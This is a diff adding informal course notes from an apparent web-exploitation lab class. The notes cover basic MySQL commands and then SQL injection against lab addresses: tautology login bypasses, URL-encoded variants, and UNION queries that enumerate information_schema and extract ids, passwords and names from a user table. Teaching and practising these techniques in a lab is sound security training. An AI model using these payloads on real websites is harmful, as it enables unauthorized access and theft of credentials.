@@ -136,3 +136,81 @@ FROM YOUR BOX
 ssh -i .ssh/id_rsa www-data@10.50.37.95 ( ip for the  box ) 
 
 
+
+
+
+
+
+
+
+------------------------ WEB EX DAY 2 
+
+SQL 
+Structured Query Language
+ 
+ 
+  ON SERVER SIDE 
+  mysql ---- to start it 
+  
+  show databases;
+  show tables from session;
+  
+  select * from session.Tires;
+  ----- select everything from the database of sesssion for all fines in table of Tires 
+  
+  select tireid,name,cost from session.Tires;
+  ---- selects the items tireid, name and cost from the database of session and the table Tires.
+
+use session;
+( step into that databalse ( similar to changing cd ) 
+select * from tires ( you dont have the sepcify the database just the table)
+
+
+
+
+
+{
+WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+WHERE name=‘tom' OR '1'='1’ AND pass=‘tom' OR 1='1’
+WHERE name=‘tom' OR 1=1’ AND pass=‘tom' OR 1='1’
+}
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------
+DEFAULT DATABASES 
+INFORMATION_SCHEMA, SESSION, PERFORMANCE_SCHEMA
+
+SQL BY TH NUMBERS 
+1. BROWSE websites  as normal & find input fields and variables 
+2. test each field GET AND /OR POST
+
+
+
+user' or '1=1 ( with prompt ) 
+
+username=user&passwd=user%27+or+%271%3D1 ( with web search bar)
+
+---------------------------------------------------
+http://10.50.42.112/Union.html
+POST
+Audi' OR '1=1
+
+GET
+http://10.50.42.112/uniondemo.php?Selection=2 or 1=1
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3 #
+
+Selection=2 UNION select table_schema,table_name,Column_name from information_schema.columns
+Selection=2 UNION select table_schema,Column_name,table_name from information_schema.columns (since its 1,3 2 ) 
+
+
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3,4,5,6 #
+Selection=2 UNION select table_schema,table_name,Column_name,4,5,6 from information_schema.columns
+ ----- to get all the table 
+ 
+ 
+ TO QUERY 
+ 
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select id,pass,name from session.user
+
+
